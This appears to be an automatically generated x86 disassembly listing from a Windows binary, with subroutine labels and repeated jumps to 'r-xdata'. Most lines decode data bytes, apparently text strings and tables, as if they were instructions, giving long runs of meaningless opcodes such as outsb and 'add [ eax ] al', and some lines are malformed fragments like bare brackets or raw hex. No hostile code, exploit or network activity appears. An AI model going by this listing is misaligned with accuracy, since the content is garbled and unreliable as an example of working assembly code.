pop es
inc ebx
outsd
outsb
je r-xdata
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax ] ah
or [ edx ] al
inc esp
push cs
inc esp
lodsb [ esi ]
xor al 0x40
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
mov eax eax
pushad
rol [ ebx ] 0x1
or [ ecx ] dl
push esp
insb
jae r-xdata
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add ah ch
inc eax
outsd
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
shl al 0xcf
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
sub_43d30c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x43d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
aam 0x43
add [ edx - 0x2c ] bl
inc ebx
add [ eax ] bl
add al [ eax ]
add [ ecx + edx * 8 + 0x7340043 ] dl
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
add [ eax ] bl
jecxz r-xdata
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add al bh
adc [ eax + eax + 0x4 ] al
push cs
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
sub_43d3d0
or al 0x6
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax + 0xc ]
adc al [ eax + eax + 0x28 ]
fld [ eax + eax + 0x48 ]
adc al [ eax + eax - 0x28 ]
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax - 0x33ffbbf1 ] ch
cmove eax [ eax ]
test [ ecx ] dl
inc esp
add [ eax ] cl
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
push [ edx + edx + 0x44 ]
add ah ah
adc al [ eax + eax + 0x68 ]
adc eax [ eax + eax + 0x60 ]
adc al [ eax + eax - 0x18 ]
adc eax [ eax + eax - 0x44 ]
adc eax [ eax + eax + 0x5c ]
adc [ eax + eax - 0x80 ] eax
adc [ eax + eax + 0x7 ] eax
push esp
inc edx
jne r-xdata
add dh bh
fsub [ eax + 0x44 ]
add [ eax - 0x80000000 ] al
or eax 0x69420800
je r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
push [ eax ]
outsb
mov eax eax
push 0x70043d4
pop es
push esp
inc edx
jne r-xdata
add bh bh
mov esp es
inc esp
add [ ecx ] al
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
add [ eax ] cl
inc edx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax + 0x4208000d ] al
outsb
push esp
rol [ ebx ] cl
fcom st2
inc ebx
add [ ecx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ edx + 0x69 ] al
inc ebx
je r-xdata
adc [ edx ] eax
insb
jae r-xdata
popad
add [ eax ] al
dec [ ebx + edx * 4 ]
add [ eax ] ch
xchg ecx eax
inc ecx
add [ eax + eax ] bh
add dh bh
sub al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
outsb
jae r-xdata
pushfd
jpo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + 0x4493 ] ch
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ ecx ] ah
add bh bh
or al 0x93
and [ ebp + 0x44 ] cl
add [ eax - 0x17ffbb61 ] bh
lahf
inc esp
add [ edi + edi * 4 + 0x44 ] dh
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
sub_43daec
or al 0x6
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax - 0x58 ]
adc eax 0xd9280044
inc esp
add [ esi + edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x18441fc9
add al [ eax ]
add [ edx + ebx * 8 ] ah
je r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
inc edx
xor al 0x7
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
add [ esp + eax ] dh
inc edx
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add [ esp + edx ] dh
inc esp
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
inc esp
add al bl
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax ] ah
adc eax 0x15400044
inc esp
add ah cl
adc al 0x44
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
xor [ esi ] dl
inc esp
add [ esi + edx + 0x44 ] al
add [ esi + edx + 0x44 ] cl
add al ch
push ss
inc esp
add [ edx + 0x14a00044 ] cl
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
inc esp
add [ eax + 0x28004415 ] ch
fld [ eax + eax + 0x4 ]
push ss
rol [ eax + 0x70043db ] 0xf
push esp
inc ebx
jne r-xdata
add [ eax ] bl
jecxz r-xdata
xor al 0x40
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
je r-xdata
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
inc eax
fiadd [ ebx ]
fcom st2
inc ebx
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
insb
jae r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax + 0xa0cff00 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + ecx ]
inc ebx
add [ edi + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
fadd [ ebx ]
sbb [ edx ] al
add [ eax ] al
and al 0xda
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fadd [ ebx ]
add [ eax ] al
add [ eax ] al
sub_43e095
fcomp [ esi - 0x3fcbffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
or [ edx ] eax
add bh bh
add [ eax ] al
sub [ eax ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc esp
jb r-xdata
jo r-xdata
dec ebx
jns r-xdata
in al 0x7c
inc ecx
jl r-xdata
jo r-xdata
in al 0x10
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x6f570800
jb r-xdata
jl r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
dec edi
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
inc esp
jb r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
loopne r-xdata
jo r-xdata
dec edi
inc esp
add al bl
add [ eax ] al
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
jb r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
outsd
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
jae r-xdata
dec esi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc ebp
outsb
inc esp
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
add [ edx + eax ] dl
add [ eax ] al
xchg esp eax
rol [ ebx ] 0x1
in al 0x43
push ebp
jo r-xdata
inc esp
add al bl
add [ eax ] eax
dec edi
inc esp
add al ch
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
outsb
push ebx
je r-xdata
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
add [ eax ] eax
mov eax 0xe800444f
jns r-xdata
je r-xdata
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
outsb
inc ebp
js r-xdata
push ecx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x4f070026 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push eax
inc esp
add al ch
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0035 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
outsb
push ebx
je r-xdata
je r-xdata
jb r-xdata
push esp
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
jb r-xdata
inc esp
add [ eax + 0x4f09002a ] al
add [ eax ] al
add [ eax ] bl
jecxz r-xdata
inc eax
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
jb r-xdata
add [ edx - 0x1c ] dl
inc ebx
add [ eax ] al
cmp ah ah
inc ebx
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
inc esp
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add al bh
push ss
inc esp
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
add al 0x42
inc esp
jb r-xdata
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
inc esp
outsd
add [ esp + eax ] dh
inc edx
xchg esp eax
inc esp
add [ edi + eax * 8 - 0x625fffbc ] dl
inc esp
add [ edi + eax + 0x42 ] cl
lea eax [ bx + si ]
push 0x43e3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
in al 0x43
sub_43e0db
add [ eax ] eax
call [ eax + eax * 8 + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
js r-xdata
dec ebx
jns r-xdata
in al 0x7c
inc ecx
add al al
add [ eax ] eax
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
push eax
outsd
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
inc ebp
outsb
inc esp
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
loopne r-xdata
jo r-xdata
dec edi
inc esp
add al bl
add [ eax ] al
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or ecx [ edi + 0x6e ]
jb r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002c ] al
outsb
inc ebp
outsb
je r-xdata
jl r-xdata
add [ eax + 0x4f070026 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
push eax
inc esp
add al ch
add [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
jae r-xdata
dec esi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
outsb
inc ebp
js r-xdata
add [ edx + eax ] dl
add [ eax ] al
xchg esp eax
rol [ ebx ] 0x1
in al 0x43
push ebp
jo r-xdata
inc esp
add al bl
add [ eax ] eax
dec edi
inc esp
add al ch
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
outsb
push ebx
je r-xdata
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
add [ eax ] eax
mov eax 0xe800444f
jns r-xdata
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0035 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
outsb
push ebx
je r-xdata
je r-xdata
jb r-xdata
push esp
xor al 0x7
inc edx
add [ eax - 0x77ffbfcc ] ch
add [ edx ] al
mov al 0x34
inc eax
xchg edx eax
inc esp
add [ eax - 0x5fffbaf8 ] al
or [ ebp ] al
add [ 0xffffffff92440045 ] 0x44
add [ eax - 0x6e ] cl
inc esp
add [ edx + eax * 8 + 0x44 ] al
add [ eax - 0x3e ] dh
inc esp
add [ eax - 0x3fffbb63 ] cl
xchg ebx eax
inc esp
add [ edi + ebx * 4 ] dl
inc esp
add [ esi + ebx * 4 - 0x5e5fffbc ] cl
inc esp
add [ eax + 0x44 ] cl
add al dl
cmove eax [ eax ]
hlt
inc esp
add al cl
stosd [ edi ]
inc ecx
add [ eax + eax * 8 + 0x44 ] dh
jb r-xdata
inc esp
dec edi
add [ eax ] bl
jecxz r-xdata
inc eax
add [ eax - 0x4fffbe00 ] cl
xor al 0x40
jb r-xdata
add [ edx - 0x1c ] dl
inc ebx
add [ eax ] al
cmp ah ah
inc ebx
add [ eax - 0x6bffbb6c ] cl
mov [ eax + eax - 0x60 ] 0x4c00449d
pop es
inc edx
inc esp
add [ esp + eax ] ch
inc edx
add [ edi + eax + 0x42 ] dl
add al bh
push ss
inc esp
add [ esi + ecx ] al
inc ebp
add [ eax ] ah
adc eax [ ebp ]
insb
adc al [ ebp ]
cld
add al 0x42
inc esp
jb r-xdata
add al dh
lds eax [ eax + eax - 0x10 ]
adc al [ ebp ]
loopne r-xdata
inc esp
outsd
add [ esp + eax ] dh
inc edx
xchg esp eax
inc esp
add [ edi + eax * 8 - 0x625fffbc ] dl
inc esp
add [ edi + eax + 0x42 ] cl
lea eax [ bx + si ]
push 0x43e3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x43 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
in al 0x43
sub_43e3e4
or al 0x6
inc ebp
add al cl
push es
inc ebp
add [ ecx + eax + 0x6ac0045 ] cl
inc ebp
add [ eax + ecx * 8 ] cl
inc esp
add [ eax + 0x400044ce ] ah
fadd [ eax + eax - 0x18 ]
sbb [ eax + eax + 0x28 ] al
fld [ eax + eax + 0x40 ]
sbb [ eax + eax - 0x28 ] eax
fadd [ eax + eax - 0x24 ]
fadd [ eax + eax - 0x6c ]
fild [ eax + eax + 0x3c ]
fild [ eax + eax - 0x14 ]
pop es
inc ebp
add [ ebp + 0x19e00044 ] al
inc ebp
add [ eax ] dh
add al 0x45
add [ eax + 0x7 ] bl
inc ebp
add [ eax + 0x17 ] bl
inc esp
add [ eax + ebx + 0x44 ] bl
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x6cff
sub_43e804
add [ eax ] eax
call [ eax + eax * 8 + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070024 ] al
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
jo r-xdata
push eax
outsd
jo r-xdata
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
add [ eax + 0x4f07002b ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or ecx [ edi + 0x6e ]
jb r-xdata
inc eax
add [ eax ] eax
jl r-xdata
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002c ] al
outsb
inc ebp
js r-xdata
push ecx
dec ebx
jns r-xdata
in al 0x7c
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
jl r-xdata
popad
dec ebp
outsd
jbe r-xdata
dec ebp
outsd
jne r-xdata
dec edi
outsb
jae r-xdata
outsb
add al cl
add [ eax ] eax
jns r-xdata
je r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
popad
inc esp
jb r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
dec edi
fmul [ esi + 0x44 ]
add al ah
add [ eax ] al
jmp eax
mov eax 0xe800444f
loopne r-xdata
jo r-xdata
jb r-xdata
inc esp
dec edi
dec edi
inc esp
add al bl
add [ eax ] al
add al 0x50
inc esp
add al ah
add [ eax ] eax
jmp eax
jl r-xdata
jo r-xdata
adc ch [ edx + 0x56 ]
imul esi [ edx + 0x74 ] 0x4f6c6175
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
jae r-xdata
dec esi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
dec ebp
outsd
jne r-xdata
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x70 ] bp
push ecx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
push eax
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc eax 0x47424c54
je r-xdata
jb r-xdata
je r-xdata
inc esp
jb r-xdata
push ebx
je r-xdata
push ebp
jo r-xdata
inc esp
add al bl
add [ eax ] eax
add [ eax ] eax
dec edi
inc esp
add al ch
outsb
push ebx
je r-xdata
arpl [ ebx + 0x28 ] bp
push ecx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
push 0x65
popad
je r-xdata
je r-xdata
jb r-xdata
inc ebx
je r-xdata
jb r-xdata
nop
insb
0xd030043 0x4c54
popad
outsb
popad
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0034 ] al
push ebx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
push esp
in eax dx
inc ebx
add [ edx + eax ] bh
outsb
je r-xdata
inc esp
popad
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x76 ] si
outsb
je r-xdata
jb r-xdata
lea eax [ eax ]
cmp al 0xeb
ja r-xdata
inc ebp
jbe r-xdata
insb
jae r-xdata
jne r-xdata
outsd
outsb
je r-xdata
outsb
or [ edi ] al
adc [ edx + 0x4f ] ch
ja r-xdata
jb r-xdata
jb r-xdata
add [ edx + edx + 0x45 ] ch
add ah bh
add ah ch
xor [ eax ] eax
or [ edx ] dh
inc eax
add [ eax - 0xfffbbdf ] al
or [ edi ] al
inc ebx
outsd
outsb
je r-xdata
add cl [ eax ]
pop es
add [ eax + 0x3400446b ] ch
pop es
add [ eax ] al
push edx
in eax dx
inc ebp
jbe r-xdata
add ecx [ eax ]
pop es
inc ebx
jb r-xdata
arpl [ eax + eax - 0x8 ] si
pushad
inc esp
add [ eax + edx + 0x40 ] dl
add [ ecx + edx - 0x3f74ffc0 ] dl
dec edi
bound ebp [ edx + 0x65 ]
inc esp
popad
je r-xdata
add al 0x44
mov eax eax
push ebx
je r-xdata
outsb
inc ebx
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc ebx
add [ eax ] cl
andps xmm1 [ edx + eax * 2 + 0x47 ]
shl ah 0xea
inc ebx
add [ eax ] cl
add [ eax + edx + 0x40 ] dl
add [ ecx + edx ] al
ja r-xdata
insb
dec edi
push ebx
je r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add ecx [ eax ]
pop es
js r-xdata
outsd
outsb
je r-xdata
jb r-xdata
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
